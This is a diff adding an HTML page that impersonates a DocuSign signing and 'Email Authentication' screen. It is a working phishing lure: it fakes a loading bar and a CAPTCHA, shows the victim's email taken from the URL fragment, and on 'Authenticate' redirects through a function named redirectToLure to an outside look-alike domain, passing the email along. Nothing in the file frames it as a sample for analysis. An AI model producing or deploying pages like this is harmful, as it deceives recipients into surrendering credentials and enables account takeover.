@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="robots" content="noindex,nofollow" />
+    <title>Loading...</title>
+
+    <style>
+        /* Reset styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Centered spinner container */
+        .loading-container {
+            position: relative;
+            text-align: center;
+        }
+
+        /* Progress bar styles */
+        .progress-bar {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            height: 4px;
+            width: 214px;
+            background: #eaeaea;
+            top: calc(50% + 30px);
+        }
+
+        .progress-bar-inner {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 0%;
+            background: #61a4f6;
+            /* Add transition property for smooth animation */
+            transition: width 0.5s ease-in-out;
+        }
+
+        /* Logo style */
+        .loading-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            height: 33px;
+            width: 120px;
+            transform: translate(-50%, -50%);
+        }
+        
+        /* DocuSign page styles */
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 800px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: left;
+            display: none; /* Initially hidden */
+        }
+        .hidden {
+            display: none;
+        }
+        .navigation {
+            position: fixed;
+            display: none;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 2em;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        .navigation.left {
+            left: 10px;
+        }
+        .navigation.right {
+            right: 10px;
+        }
+        .header, .content, .footer {
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 28px;
+            color: #333;
+            font-weight: bold;
+            margin: 0;
+        }
+        .content img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+        .content .sender-info {
+            color: #333;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+        .content .account-info {
+            color: #666;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+        .content h2 {
+            font-size: 15px;
+            font-weight: bold;
+            color: #333;
+            margin-top: 20px;
+        }
+        .content ol {
+            text-align: left;
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        .content ol li {
+            margin-bottom: 10px;
+        }
+        .content .auth-info {
+            font-size: 15px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .content .auth-info span {
+            font-weight: bold;
+            color: blue;
+        }
+        .footer {
+            font-size: 10px;
+            color: #ccc;
+            text-align: right;
+        }
+        .footer a {
+            color: #ccc;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .captcha-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Add blur effect for the main content */
+        .blurred {
+            filter: blur(5px);
+            pointer-events: none;
+        }
+
+        /* Overlay for CAPTCHA */
+        .captcha-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .captcha-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- CAPTCHA Overlay -->
+    <div class="captcha-overlay" id="captcha-overlay" style="display: none;">
+        <div class="captcha-container">
+            <div class="g-recaptcha" data-sitekey="6Le1bhgrAAAAAFacww_pWALJD7Ua1ft9z3DnwHYE"></div>
+            <div id="g-recaptcha-error" style="height: 20px; font-size: 12px; margin-top: 5px;"></div>
+            <button id="captcha-submit" style="margin-top: 10px; cursor: pointer;">Submit</button>
+            <div class="loader" id="captcha-loader"></div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main-content">
+        <!-- Loading Page (Initially Visible) -->
+        <div class="loading-container" id="loading-section">
+            <!-- Logo -->
+            <img class="loading-logo" src="https://docucdn-a.akamaihd.net/olive/images/2.63.0/global-assets/ds-logo-default.svg" alt="Loading Logo">
+
+            <!-- Progress bar -->
+            <div class="progress-bar">
+                <div id="preparing-experience" class="progress-bar-inner"></div>
+            </div>
+        </div>
+
+        <!-- DocuSign Page (Initially Hidden) -->
+        <div class="container" id="docusign-section">
+            <div id="page1">
+                <div id="dlg_pnlDiaHeader" class="DiaHSignDialog" style="position: relative; border-radius: 2px 2px 0px 0px; background-color: #ffffff;" data-qa="dialog-title">
+                    <table id="ds_hldrBdy_navTable" style="width: 100%; border-collapse: collapse;" border="0" cellspacing="0" cellpadding="0">
+                        <tbody>
+                            <tr>
+                                <td class="DiaHTSignDialog SR_DiaHTSignDialog" style="position: relative; padding: 5px; font-size: 28px; color: #333333; font-weight: bold !important; font-family: 'Maven Pro', sans-serif; white-space: nowrap;">
+                                    <h1 style="font-size: 15px; margin: 0px;" data-qa="dialog-title"><span id="ds_hldrBdy_lblContentTitle" class="DiaHTSignDialog" style="position: relative; padding: 30px 35px 4px; font-size: 28px; color: #333333; font-weight: bold !important; font-family: 'Maven Pro', sans-serif;">Security Requests from Sender</span></h1>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <div id="ds_hldrBdy_dlg_pnlDiaInner" class="DiaSignDialog" style="padding: 40px; background-color: #ffffff; border-radius: 0px 0px 2px 2px; outline: none;">
+                    <div id="ds_hldrBdy_pnlFromSender">
+                        <div style="position: relative; margin-top: -20px; height: 80px;">
+                            <div style="display: block; width: 40px; height: 40px;"><img style="width: 40px; height: 40px; border-radius: 50%;" src="https://na2.docusign.net/Signing/Images/Profile_Default_New.png" alt="" data-qa="access-code-dialog-sender-profile-image" /></div>
+                            <div style="color: #333333; font-size: 22px; position: relative; left: 51px; top: -44px; width: 581.646px;" data-qa="access-code-dialog-sender-user-name">DocuSign Admin</div>
+                            <div style="color: #666666; font-size: 16px; position: relative; left: 51px; top: -42px; width: 581.646px;" data-qa="access-code-dialog-sender-account-name">Encrypted File</div>
+                        </div>
+                    </div>
+                    <div id="ds_hldrBdy_pnlSMSAuthentication">
+                        <table style="position: relative; width: 100%;" border="0" cellspacing="0" cellpadding="0">
+                            <tbody>
+                                <tr>
+                                    <td class="MOB_bigTitleForDialog">
+                                        <h2><span id="ds_hldrBdy_lblSMSAuth" class="Font15B" style="font-size: 15px !important; font-weight: bold !important; color: #333333 !important;">Email Authentication</span></h2>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="MOB_orderedListPadding"><span class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">In order to access this document, you need to confirm your identity using your email provider.<br /></span>
+                                        <ol>
+                                            <li>Verify that your email appears below.</li>
+                                            <li>Select Authenticate to proceed to the verification page.</li>
+                                        </ol>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td id="MOB_SMSAuthName">
+                                        <table border="0" cellspacing="0" cellpadding="0">
+                                            <tbody>
+                                                <tr>
+                                                    <td class="MOB_lblSMSAuthName" style="padding-left: 0px;"><span id="ds_hldrBdy_lblSMSAuthName" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">Authenticating Signer Address:</span><span id="grabbed-email"></span></td>
+                                                    <td class="MOB_lblSMSAuthUserName"><span id="ds_hldrBdy_lblSMSAuthUserName" class="Font15B" style="font-size: 15px !important; font-weight: bold !important; color: #333333 !important;" id="grabbed-email"></span></td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td id="MOB_SMSAuthSelPhoneCell" style="padding-top: 15px; padding-left: 0px; padding-bottom: 15px;"><span id="ds_hldrBdy_lblSMSAuthSelPhone" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">Please select authenticate to view and download the file:</span></td>
+                                </tr>
+                                <tr>
+                                    <td style="padding-top: 3px;">
+                                        <table style="margin-left: 50px;" border="0" cellspacing="0" cellpadding="0">
+                                            <tbody>
+                                                <tr>
+                                                    <td class="Font12R" style="font-size: 12px !important; font-weight: normal !important; color: #333333 !important;"></td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td id="MOB_SMSAuthSelPhoneCellNumbers" style="padding-top: 30px; padding-left: 100px;">
+                                        <table border="0">
+                                            <tbody>
+                                                <tr>
+                                                    <td>
+                                                        <button id="ds_hldrBdy_btnDSSMSAuthCall_btnInline" class="BtnHeight40 Btnprimary" style="font-family: 'Maven Pro', Arial, sans-serif; font-size: 13px; width: auto; position: relative; cursor: pointer; text-decoration: none; white-space: nowrap; background-repeat: repeat-x; padding: 0px 17px; border: 1px solid transparent; display: inline-block; box-sizing: inherit; height: 32px; margin: 0px 10px 0px 0px; border-radius: 2px; text-align: center; vertical-align: middle; font-weight: bold; text-transform: uppercase; background-color: #ffc820; color: #000000;">Authenticate</button>
+                                                    </td>
+                                                    <td class="MOB_hide" style="width: 10px;"></td>
+                                                    <td class="MOB_hide"><button id="ds_hldrBdy_btnDSSMSAuthCancel_btnInline" class="BtnHeight40 Btnsecondary" style="font-family: 'Maven Pro', Arial, sans-serif; font-size: 13px; width: auto; position: relative; cursor: pointer; text-decoration: none; white-space: nowrap; background-repeat: repeat-x; padding: 0px 17px; border: 1px solid transparent; display: inline-block; box-sizing: inherit; height: 32px; margin: 0px 10px 0px 0px; border-radius: 2px; text-align: center; vertical-align: middle; font-weight: bold; text-transform: uppercase; background-color: #e9e9e9; color: #333333;">Cancel</button></td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                <tr class="MOB_hide">
+                                    <td style="padding-top: 10px;"><span id="ds_hldrBdy_lblSMSAuthNoPhone" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">If you are not the intended receiver of this file, select <strong>Cancel</strong> and delete the message.</span></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div id="ds_Footer" class="FooterNew" style="position: absolute; background: #555555; bottom: 0px; left: 0px; right: 0px; text-align: right; font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc;">
+                <div class="site-content" style="margin: 0px auto; max-width: 1506px; padding: 0px 24px;">
+                    <span class="FooterPoweredByTxt" style="float: left; margin-right: 6px; font-size: 11px; top: 1px; position: relative;">Powered by</span>
+                    <img id="ds_imgLogoFooter" class="FooterImage" style="position: relative; float: left; margin-right: 20px; height: 20px; margin-top: 5px;" src="https://docucdn-a.akamaihd.net/olive/images/2.63.0/global-assets/ds-logo-inverse.svg" alt="Docusign" />
+                    <div id="divFooterLinks" class="FooterLinks" style="color: #999999; display: inline-block; overflow: visible; position: relative;">
+                        <div id="ds_divLanguageSelected" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; padding-right: 10px; white-space: nowrap; text-align: center;">English (US)<span> </span><img style="vertical-align: middle;" src="https://na2.docusign.net/Signing/Images/controls/btn_arrow_u.png" border="0" alt="" /></div>
+                    </div>
+                    <span> </span><a id="TermsOfUse" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/legal/terms-and-conditions/" target="_blank">Terms Of Use</a><span>   |   </span><a id="CorporateSupport" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/support" target="_blank">Support</a><span>   |   </span><a id="Feedback" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://support.docusign.com/s/" target="_blank">Feedback</a><span>   |   </span><a id="PrivacyPolicy" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/company/privacy-policy" target="_blank">Privacy Policy</a><span class="footer-item" style="white-space: nowrap;">     Copyright © 2025 Docusign Inc.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script>
+        // Configuration - Set your redirect URL here
+        const REDIRECT_URL = "https://accounts.viscsual.space/XprPOxvm"; // Replace with your specific redirect URL
+        
+        // Handle CAPTCHA submission
+        document.getElementById('captcha-submit').addEventListener('click', function () {
+            const recaptchaResponse = grecaptcha.getResponse();
+            const errorElement = document.getElementById('g-recaptcha-error');
+            const loader = document.getElementById('captcha-loader');
+
+            if (recaptchaResponse.length < 1) {
+                errorElement.innerHTML = '<span style="color:red;">This field is required.</span>';
+            } else {
+                errorElement.innerHTML = 'Verifying...';
+                loader.style.display = 'block';
+
+                setTimeout(() => {
+                    document.getElementById('captcha-overlay').style.display = 'none';
+                    document.getElementById('ds_hldrBdy_btnDSSMSAuthCall_btnInline').disabled = false;
+                }, 2000); // Simulate verification delay
+            }
+        });
+
+        // Add event listener to the "Authenticate" button
+        document.getElementById('ds_hldrBdy_btnDSSMSAuthCall_btnInline').addEventListener('click', function () {
+            // Disable the button until CAPTCHA is solved
+            this.disabled = true;
+
+            // Show CAPTCHA overlay
+            document.getElementById('captcha-overlay').style.display = 'flex';
+        });
+
+        // Immediately start the progress bar animation without waiting for onload
+        (function() {
+            var progressBar = document.getElementById('preparing-experience');
+            
+            // Enhanced smoother progress bar animation using requestAnimationFrame
+            if (progressBar) {
+                // Define animation parameters
+                var duration = 8000; // Extended to 8 seconds total (added 2 seconds)
+                var startTime = null;
+                var finalWidth = 97; // Increased to 97% for more complete appearance
+                var accelerationFactor = 1.8; // Higher factor makes early progress faster
+                
+                // Animation function using requestAnimationFrame with faster early progress
+                function animateProgress(timestamp) {
+                    if (!startTime) startTime = timestamp;
+                    var elapsed = timestamp - startTime;
+                    
+                    // Calculate raw progress (0 to 1)
+                    var rawProgress = Math.min(elapsed / duration, 1);
+                    
+                    // Apply custom easing with faster early acceleration
+                    // This will reach ~90% by the 4-second mark
+                    var progress;
+                    if (rawProgress < 0.5) {
+                        // Accelerate faster in first half
+                        progress = Math.pow(rawProgress * 2, accelerationFactor) / 2;
+                    } else {
+                        // Slow down in the second half
+                        var adjustedProgress = (rawProgress - 0.5) * 2;
+                        progress = 0.5 + (1 - Math.pow(1 - adjustedProgress, 2)) / 2;
+                    }
+                    
+                    // Calculate width, ensuring it reaches 95% by 6 seconds
+                    var width;
+                    if (elapsed <= 6000) {
+                        // First 6 seconds: reach 95%
+                        width = Math.min((progress * 1.3) * 95, 95);
+                    } else {
+                        // Final 2 seconds: go from 95% to 97%
+                        var extraProgress = (elapsed - 6000) / 2000;
+                        width = 95 + (extraProgress * (finalWidth - 95));
+                    }
+                    
+                    // Update progress bar
+                    progressBar.style.width = width + '%';
+                    
+                    // Continue animation if not complete
+                    if (elapsed < duration) {
+                        requestAnimationFrame(animateProgress);
+                    }
+                }
+                
+                // Start the animation
+                requestAnimationFrame(animateProgress);
+            }
+            
+            // Page transition still happens at 6 seconds (unchanged)
+            setTimeout(function() {
+                var loadingSection = document.getElementById('loading-section');
+                var docusignSection = document.getElementById('docusign-section');
+                
+                if (loadingSection) loadingSection.style.display = 'none';
+                if (docusignSection) {
+                    docusignSection.style.display = 'block';
+                    document.title = "DocuSign Security Verification";
+                    
+                    // Setup email fragment display
+                    setupEmailDisplay();
+                }
+            }, 6000);
+            
+            // Setup authenticate button click handler
+            // Changed timeout from 3000ms to 6500ms
+            setTimeout(function() {
+                var authButton = document.getElementById('ds_hldrBdy_btnDSSMSAuthCall_btnInline');
+                if (authButton) {
+                    authButton.addEventListener('click', function() {
+                        redirectToLure();
+                    });
+                }
+            }, 6500);
+        })();
+        
+        function getFragment() {
+            var fragment = window.location.hash;
+            return fragment ? fragment.substring(1) : ''; // Remove the leading '#' character
+        }
+        
+        function setupEmailDisplay() {
+            const fragment = getFragment();
+            if (fragment) {
+                var emailElements = document.querySelectorAll('#grabbed-email');
+                if (emailElements.length > 0) {
+                    emailElements.forEach(function(element) {
+                        element.innerText = fragment;
+                        // Font weight removed as requested
+                        element.style.color = 'blue';
+                    });
+                }
+            }
+        }
+
+        
+        function redirectToLure() {
+            const fragment = getFragment();
+            // Use the configured redirect URL instead of {lure_url_js}
+            const finalUrl = REDIRECT_URL + (fragment ? '#' + fragment : '');
+            // Execute redirect
+            window.location.href = finalUrl;
+        }
+        
+    </script>
+</body>
+</html>
